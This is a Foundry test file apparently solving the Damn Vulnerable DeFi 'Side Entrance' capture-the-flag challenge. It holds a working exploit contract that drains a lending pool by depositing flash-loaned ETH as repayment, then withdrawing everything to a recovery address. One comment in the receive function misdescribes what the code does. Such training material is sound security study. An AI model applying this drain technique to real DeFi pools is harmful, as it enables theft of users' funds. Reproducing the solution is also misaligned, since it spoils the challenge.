// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceExploiter {
    SideEntranceLenderPool private pool;
    address private recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function startAttack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    // We were required to call an execute function during the flashLoan and get the money back to the pool.
    function execute() public payable{
        pool.deposit{value: msg.value}();
    }
// Because of handling ETH, we need a receive function which as soon as it receives the ETH sends to the recovery address
    receive() external payable {
        //Deposit the received ETH back to the pool
        payable(recovery).transfer(address(this).balance); //Transfer syntax 
        //Recovery is now made into payable to be able to receive ETH.
    }
}

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // Deploy the exploiter
        SideEntranceExploiter attacker = new SideEntranceExploiter(
            pool,
            recovery
        );

        //Start attack
        attacker.startAttack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(
            recovery.balance,
            ETHER_IN_POOL,
            "Not enough ETH in recovery account"
        );
    }
}
